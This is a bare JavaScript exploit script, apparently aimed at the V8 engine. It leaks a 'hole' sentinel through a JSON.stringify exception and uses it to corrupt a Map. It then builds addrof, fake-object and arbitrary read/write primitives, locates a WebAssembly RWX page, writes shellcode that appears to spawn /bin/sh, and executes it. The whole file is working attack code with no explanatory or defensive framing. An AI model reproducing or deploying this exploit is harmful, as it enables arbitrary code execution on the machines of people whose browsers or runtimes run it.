var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function write_shellcode(){
    shellcode = [0x90909090d2314850n, 0x69622fbb48f63148n, 0x5f545368732f2f6en, 0x90909090050f3bb0n];
    aaw(backingStoreAddr, itof(rwx));

    for(let i =0; i<shellcode.length;i++){
        dataview.setFloat64(i*Float64Array.BYTES_PER_ELEMENT, itof(shellcode[i]), true);
    }
}

function trigger() {
    let a = [], b = [];
    let s = '"'.repeat(0x800000);
    a[20000] = s;
    for (let i = 0; i < 10; i++) a[i] = s;
    for (let i = 0; i < 10; i++) b[i] = a;

    try {
        JSON.stringify(b);
    } catch (hole) {
        return hole;
    }
    throw new Error('could not trigger');
}

function addrof(obj){
    x[5] = itof(objectMap);
    y[0] = obj;
    x[5] = itof(doubleMap);
    return ftoi(y[0]);
}

function fakeObj(addr){
    x[5] = itof(doubleMap);
    y[0] = itof(addr);
    x[5] = itof(objectMap);
}

function aar(addr){
    addr = addr & 0xffffffffn;
    let tmp = ftoi(x[6]);
    x[5] = itof(doubleMap);
    x[6] = itof(((addr - 0x8n) << 32n) + (ftoi(x[6])&0xffffffffn));
    let val = ftoi(y[0]);
    x[6] = itof(tmp);
    return val;
}

function aaw(addr, val){
    addr = addr & 0xffffffffn;
    let tmp = ftoi(x[6]);
    x[5] = itof(doubleMap);
    x[6] = itof(((addr - 0x8n) << 32n) + (ftoi(x[6])&0xffffffffn));
    y[0] = val;
    x[6] = itof(tmp);
}

let hole = trigger();

var map = new Map();
map.set(1, 1);
map.set(hole, 1);

map.delete(hole);
map.delete(hole);
map.delete(1);

var x = new Array(1.1,2.2,3.3);
var y = new Array(1.1,1.1,1.1);
map.set(0x10,-1);

map.set(x,0x200);

let doubleMap = ftoi(x[5]);
let objectMap = doubleMap - (0x81950n << 32n);
console.log("[+] objectMap: 0x"+objectMap.toString(16));
console.log("[+] doubleMap: 0x"+doubleMap.toString(16));

var target_buffer = new ArrayBuffer(0x500);
var dataview = new DataView(target_buffer);

let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
     
let wasmFunction = wasmInstance.exports.main;
let rwx = aar(addrof(wasmInstance) + 0x60n - 1n) >> 8n;
let backingStoreAddr = addrof(target_buffer)+0x1cn;

console.log("[+] rwx: 0x" + rwx.toString(16));
console.log("[+] backing store: 0x" + backingStoreAddr.toString(16));

write_shellcode();
wasmFunction();
